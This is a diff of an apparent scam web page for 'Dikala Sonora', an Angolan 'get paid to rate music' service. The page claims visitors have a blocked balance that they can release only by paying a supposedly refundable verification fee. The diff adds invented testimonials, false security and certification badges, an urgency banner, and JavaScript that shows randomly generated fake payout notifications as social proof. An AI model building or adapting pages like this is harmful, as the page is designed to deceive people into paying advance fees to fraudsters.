@@ -23,48 +23,58 @@
         }
 
         body {
-            background-color: #fff;
-            color: #333;
+            background-color: #f8fafc;
+            color: #1e293b;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
+            padding-bottom: 80px;
         }
 
         .top-bar {
             width: 100%;
-            background-color: #1ed760;
+            background-color: #e60000;
             color: white;
             text-align: center;
             padding: 10px;
             font-weight: 800;
-            font-size: 12px;
+            font-size: 11px;
             text-transform: uppercase;
+            letter-spacing: 0.5px;
+            animation: pulse-bg 2s infinite;
+        }
+
+        @keyframes pulse-bg {
+            0% { background-color: #e60000; }
+            50% { background-color: #b30000; }
+            100% { background-color: #e60000; }
         }
 
         .header {
             width: 100%;
             max-width: 600px;
-            padding: 20px;
+            padding: 15px 20px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            border-bottom: 1px solid #eee;
+            background-color: #ffffff;
+            border-bottom: 1px solid #e2e8f0;
         }
 
         .logo {
             display: flex;
             align-items: center;
-            gap: 5px;
+            gap: 8px;
         }
 
         .logo img {
-            height: 70px;
+            height: 60px;
             width: auto;
         }
 
         .logo-text {
-            font-size: 20px;
+            font-size: 18px;
             font-weight: 700;
             letter-spacing: -1px;
             color: #121212;
@@ -78,70 +88,347 @@
 
         .balance-box {
             border: 2px solid #1ed760;
-            padding: 5px 15px;
-            border-radius: 5px;
+            padding: 6px 14px;
+            border-radius: 8px;
             text-align: center;
+            background-color: #f0fdf4;
         }
 
         .balance-label {
-            font-size: 10px;
+            font-size: 9px;
             font-weight: 700;
             text-transform: uppercase;
-            color: #777;
+            color: #16a34a;
         }
 
         .balance-value {
-            font-size: 16px;
-            font-weight: 700;
-            color: #000;
+            font-size: 15px;
+            font-weight: 800;
+            color: #16a34a;
         }
 
         .content {
             width: 100%;
             max-width: 600px;
-            padding: 30px 20px;
+            padding: 24px 20px;
             text-align: center;
             display: flex;
             flex-direction: column;
             align-items: center;
+            gap: 20px;
         }
 
-        h1 {
-            color: #1ed760;
-            font-size: 20px;
+        .sales-headline {
+            color: #0f172a;
+            font-size: 22px;
             font-weight: 800;
-            margin-bottom: 10px;
+            line-height: 1.3;
             text-transform: uppercase;
         }
 
-        p {
-            color: #555;
-            font-size: 14px;
-            margin-bottom: 25px;
+        .balance-highlight {
+            color: #e60000;
+            border-bottom: 2px dashed #e60000;
+            padding-bottom: 2px;
+        }
+
+        .safe-notice {
+            background-color: #fffbeb;
+            border: 1px solid #fef3c7;
+            border-radius: 12px;
+            padding: 16px;
+            text-align: left;
+            display: flex;
+            gap: 12px;
+            align-items: flex-start;
+        }
+
+        .safe-notice-icon {
+            width: 24px;
+            height: 24px;
+            color: #d97706;
+            flex-shrink: 0;
+        }
+
+        .safe-notice-text {
+            color: #451a03;
+            font-size: 13px;
+            line-height: 1.5;
+        }
+
+        .text-green {
+            color: #16a34a;
+            font-weight: 700;
         }
 
         .video-container {
             width: 100%;
-            border-radius: 10px;
+            border-radius: 16px;
             overflow: hidden;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+            border: 2px solid #e2e8f0;
+            background-color: #000;
         }
 
         .btn-verify {
-            background-color: #e60000;
+            background-color: #1ed760;
             color: white;
             border: none;
-            padding: 20px 30px;
+            padding: 18px 24px;
             border-radius: 50px;
-            font-size: 18px;
+            font-size: 16px;
             font-weight: 800;
             cursor: pointer;
             width: 100%;
-            margin-top: 20px;
             text-transform: uppercase;
-            letter-spacing: 1px;
-            box-shadow: 0 4px 15px rgba(230, 0, 0, 0.3);
+            letter-spacing: 0.5px;
+            box-shadow: 0 6px 20px rgba(30, 215, 96, 0.35);
             animation: pulse 2s infinite;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: background-color 0.2s, transform 0.2s;
+        }
+
+        .btn-verify:hover {
+            background-color: #1db954;
+            transform: scale(1.02);
+        }
+
+        .checkout-note {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-size: 11px;
+            color: #64748b;
+            margin-top: -10px;
+        }
+
+        .lock-icon-small {
+            width: 12px;
+            height: 12px;
+            color: #64748b;
+        }
+
+        /* Security Badges Section */
+        .security-badges-container {
+            width: 100%;
+            max-width: 600px;
+            background-color: #ffffff;
+            border: 1px solid #e2e8f0;
+            border-radius: 16px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            text-align: left;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.02);
+        }
+
+        .badge-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+        }
+
+        .badge-icon {
+            width: 22px;
+            height: 22px;
+            color: #1ed760;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .badge-text {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .badge-text strong {
+            font-size: 13px;
+            color: #1e293b;
+            font-weight: 700;
+        }
+
+        .badge-text span {
+            font-size: 11px;
+            color: #64748b;
+            margin-top: 2px;
+            line-height: 1.4;
+        }
+
+        /* Testimonials Section */
+        .testimonials-container {
+            width: 100%;
+            max-width: 600px;
+            margin-top: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .testimonials-title {
+            font-size: 16px;
+            font-weight: 800;
+            color: #0f172a;
+            text-align: center;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 4px;
+        }
+
+        .testimonial-card {
+            background-color: #ffffff;
+            border: 1px solid #e2e8f0;
+            border-radius: 16px;
+            padding: 16px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.02);
+            text-align: left;
+            transition: transform 0.2s;
+        }
+
+        .testimonial-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 8px;
+        }
+
+        .testimonial-avatar {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 2px solid #1ed760;
+        }
+
+        .testimonial-user {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .testimonial-name {
+            font-size: 13px;
+            font-weight: 700;
+            color: #1e293b;
+        }
+
+        .testimonial-meta {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            margin-top: 1px;
+        }
+
+        .meta-location {
+            font-size: 10px;
+            color: #64748b;
+        }
+
+        .meta-badge {
+            font-size: 9px;
+            font-weight: 600;
+            color: #16a34a;
+            background-color: #dcfce7;
+            padding: 1px 5px;
+            border-radius: 40px;
+        }
+
+        .testimonial-rating {
+            color: #fbbf24;
+            font-size: 12px;
+            margin-bottom: 8px;
+        }
+
+        .testimonial-text {
+            font-size: 12px;
+            line-height: 1.5;
+            color: #475569;
+        }
+
+        /* Live Toast Notification */
+        .live-toast {
+            position: fixed;
+            bottom: -100px;
+            left: 20px;
+            background-color: #121212;
+            color: #fff;
+            padding: 10px 16px;
+            border-radius: 50px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            z-index: 9999;
+            transition: bottom 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275), opacity 0.3s;
+            opacity: 0;
+            border: 1px solid #333;
+            max-width: 90%;
+        }
+
+        .live-toast.show {
+            bottom: 20px;
+            opacity: 1;
+        }
+
+        .toast-avatar {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background-color: #1ed760;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #000;
+            flex-shrink: 0;
+        }
+
+        .toast-avatar svg {
+            width: 16px;
+            height: 16px;
+        }
+
+        .toast-info {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .toast-title {
+            font-size: 11px;
+            color: #eee;
+        }
+
+        .toast-text {
+            font-size: 10px;
+            color: #aaa;
+        }
+
+        .toast-amount {
+            color: #1ed760;
+            font-weight: 700;
+        }
+
+        .secure-footer {
+            width: 100%;
+            max-width: 600px;
+            margin-top: 40px;
+            text-align: center;
+            padding: 20px;
+            border-top: 1px solid #e2e8f0;
+        }
+
+        .secure-footer-text {
+            font-size: 10px;
+            color: #94a3b8;
+            line-height: 1.5;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+            100% { transform: scale(1); }
         }
 
         @media (max-width: 480px) {
@@ -155,17 +442,20 @@
                 font-size: 16px;
             }
             .content {
-                padding: 20px 15px;
+                padding: 16px 15px;
+                gap: 15px;
             }
-            h1 {
+            .sales-headline {
                 font-size: 18px;
             }
-            p {
-                font-size: 13px;
-            }
             .btn-verify {
-                padding: 16px 20px;
-                font-size: 15px;
+                padding: 15px 20px;
+                font-size: 14px;
+            }
+            .live-toast {
+                left: 10px;
+                right: 10px;
+                max-width: calc(100% - 20px);
             }
         }
     </style>
@@ -183,7 +473,7 @@
 <body>
 
     <div class="top-bar">
-        ASSISTA O VÍDEO ABAIXO PARA LIBERAR SEU DINHEIRO.
+        ⚠️ ATENÇÃO: NÃO FECHE ESTA PÁGINA ANTES DE SACAR SEU SALDO PENDENTE!
     </div>
 
     <div class="header">
@@ -192,28 +482,181 @@
             <span class="logo-text">Dikala Sonora<span class="superscript">®</span></span>
         </div>
         <div class="balance-box">
-            <div class="balance-label">Saldo</div>
+            <div class="balance-label">Saldo Pendente</div>
             <div class="balance-value" id="displayBalance">0,00 Kz</div>
         </div>
     </div>
 
     <div class="content">
-        <h1>DESBLOQUEIO DE SALDO</h1>
-        <p>Veja como verificar a sua conta assistindo ao vídeo.</p>
+        <h1 class="sales-headline">Seu saldo de <span class="balance-highlight" id="dynamicHeadlineBalance">0,00 Kz</span> está bloqueado!</h1>
+        
+        <div class="safe-notice">
+            <svg class="safe-notice-icon" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                <path d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/>
+            </svg>
+            <p class="safe-notice-text">
+                Para liberar o seu saldo acumulado de <strong><span class="text-green" id="noticeBalance">0,00 Kz</span></strong> e habilitar saques diários imediatos via Express, é necessário realizar uma verificação de segurança antifraude assistindo ao tutorial rápido abaixo.
+            </p>
+        </div>
 
-        <div class="video-container" style="display: block;">
+        <div class="video-container">
             <vturb-smartplayer id="vid-6a1d3e6c35319bc2b5e9af2b"
                 style="display: block; margin: 0 auto; width: 100%; max-width: 400px;"></vturb-smartplayer>
             <script
                 type="text/javascript"> var s = document.createElement("script"); s.src = "https://scripts.converteai.net/5b6e7aa6-946a-4ac0-8394-9c924b02807e/players/6a1d3e6c35319bc2b5e9af2b/v4/player.js", s.async = !0, document.head.appendChild(s); </script>
+        </div>
+
+        <!-- SEÇÃO DE SEGURANÇA -->
+        <div class="security-badges-container">
+            <div class="badge-item">
+                <svg class="badge-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+                    <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+                </svg>
+                <div class="badge-text">
+                    <strong>Conexão Criptografada SSL</strong>
+                    <span>Todos os seus dados estão seguros. A verificação é protegida com criptografia de ponta a ponta.</span>
+                </div>
+            </div>
+            <div class="badge-item">
+                <svg class="badge-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                </svg>
+                <div class="badge-text">
+                    <strong>Garantia de Devolução Integral</strong>
+                    <span>O valor pago na taxa de verificação é 100% reembolsável e será estornado junto com o seu primeiro saque.</span>
+                </div>
+            </div>
+            <div class="badge-item">
+                <svg class="badge-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <circle cx="12" cy="12" r="10"/>
+                    <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
+                    <polyline points="22 4 12 14.01 9 11.01"/>
+                </svg>
+                <div class="badge-text">
+                    <strong>Site Auditado e Confiável</strong>
+                    <span>Sistema certificado pelo Google Safe Browsing e McAfee SECURE contra qualquer tipo de ameaça.</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- SEÇÃO DE DEPOIMENTOS -->
+        <div class="testimonials-container">
+            <h2 class="testimonials-title">Quem já sacou, recomenda! ⭐</h2>
+            
+            <div class="testimonial-card">
+                <div class="testimonial-header">
+                    <img class="testimonial-avatar" src="testemunho_1.png" alt="Juliana Mateus">
+                    <div class="testimonial-user">
+                        <div class="testimonial-name">Juliana Mateus</div>
+                        <div class="testimonial-meta">
+                            <span class="meta-location">Luanda</span>
+                            <span class="meta-badge">✔️ Ouvinte Verificada</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="testimonial-rating">★★★★★</div>
+                <p class="testimonial-text">
+                    Gente, no começo achei que era golpe, mas resolvi arriscar! Fiz a verificação do cadastro de saldo e em menos de 2 minutos recebi de volta o valor da verificação + todo o saldo acumulado das minhas avaliações! Já comprei saldo de internet e estou super feliz. Muito prático! 💸🔥🤩
+                </p>
+            </div>
+
+            <div class="testimonial-card">
+                <div class="testimonial-header">
+                    <img class="testimonial-avatar" src="testemunho_2.png" alt="António Bumba">
+                    <div class="testimonial-user">
+                        <div class="testimonial-name">António Bumba</div>
+                        <div class="testimonial-meta">
+                            <span class="meta-location">Benguela</span>
+                            <span class="meta-badge">✔️ Ouvinte Verificado</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="testimonial-rating">★★★★★</div>
+                <p class="testimonial-text">
+                    Muito top! A plataforma realmente paga por avaliar os sons do Youtube e artistas locais. A taxa de verificação serve para ativar nossa chave de saque Express e cai na mesma hora tudo junto na conta. O suporte também me ajudou rápido no WhatsApp. Recomendo muito! 👍🏾🇦🇴
+                </p>
+            </div>
+
+            <div class="testimonial-card">
+                <div class="testimonial-header">
+                    <img class="testimonial-avatar" src="testemunho_3.png" alt="Sandra Pinto">
+                    <div class="testimonial-user">
+                        <div class="testimonial-name">Sandra Pinto</div>
+                        <div class="testimonial-meta">
+                            <span class="meta-location">Lubango</span>
+                            <span class="meta-badge">✔️ Ouvinte Verificada</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="testimonial-rating">★★★★★</div>
+                <p class="testimonial-text">
+                    Nota 10/10 para a Dikala Sonora! Estava com 15.000 Kz travados e agora que fiz o desbloqueio já caiu na minha conta bancária via transferência. É muito seguro e honesto. O vídeo explica direitinho como fazer. Obrigada!!! 😍💰✨
+                </p>
+            </div>
+        </div>
+
+        <div class="secure-footer">
+            <p class="secure-footer-text">
+                © 2026 Dikala Sonora® Inc. Todos os direitos reservados.<br>
+                Termos de Uso • Política de Privacidade • Suporte ao Cliente
+            </p>
         </div>
     </div>
 
     <script>
         // Load Balance
         const currentBalance = parseFloat(localStorage.getItem('spotifyAngolaBalance')) || 0;
-        document.getElementById('displayBalance').innerText = currentBalance.toLocaleString('pt-AO') + ' Kz';
+        const formattedBalance = currentBalance.toLocaleString('pt-AO') + ' Kz';
+        document.getElementById('displayBalance').innerText = formattedBalance;
+        document.getElementById('dynamicHeadlineBalance').innerText = formattedBalance;
+        document.getElementById('noticeBalance').innerText = formattedBalance;
+
+        // --- Live Toast Notifications System ---
+        const toastNames = [
+            "António Bumba", "Sandra Mateus", "Juliana Pinto", "Manuel Cordeiro", "Pedro Miguel",
+            "Fátima Salvador", "João Domingos", "Isabel Neto", "Kelson Bento", "Ndalu Silva",
+            "Gisela Gomes", "Daniela Cardoso", "Afonso Cruz", "Valdemar Jorge", "Marisa Sousa"
+        ];
+
+        const toastLocations = ["Luanda", "Benguela", "Huambo", "Lobito", "Cabinda", "Lubango", "Namibe", "Uíge", "Malanje"];
+
+        function showLiveNotification() {
+            const name = toastNames[Math.floor(Math.random() * toastNames.length)];
+            const location = toastLocations[Math.floor(Math.random() * toastLocations.length)];
+            const amount = Math.floor(Math.random() * (75000 - 8000 + 1) + 8000).toLocaleString('pt-AO');
+            
+            const toast = document.createElement('div');
+            toast.className = 'live-toast';
+            toast.innerHTML = `
+                <div class="toast-avatar">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+                </div>
+                <div class="toast-info">
+                    <div class="toast-title"><strong>${name}</strong> (${location})</div>
+                    <div class="toast-text">Acabou de receber <span class="toast-amount">${amount} Kz</span></div>
+                </div>
+            `;
+            document.body.appendChild(toast);
+            
+            // Animate in
+            setTimeout(() => {
+                toast.classList.add('show');
+            }, 100);
+            
+            // Remove after 4.5 seconds
+            setTimeout(() => {
+                toast.classList.remove('show');
+                setTimeout(() => {
+                    toast.remove();
+                }, 500);
+            }, 4500);
+        }
+
+        // Start notifications loop every 8 seconds
+        setInterval(showLiveNotification, 8000);
+        // First notification after 3 seconds
+        setTimeout(showLiveNotification, 3000);
     </script>
 </body>
-
 </html>
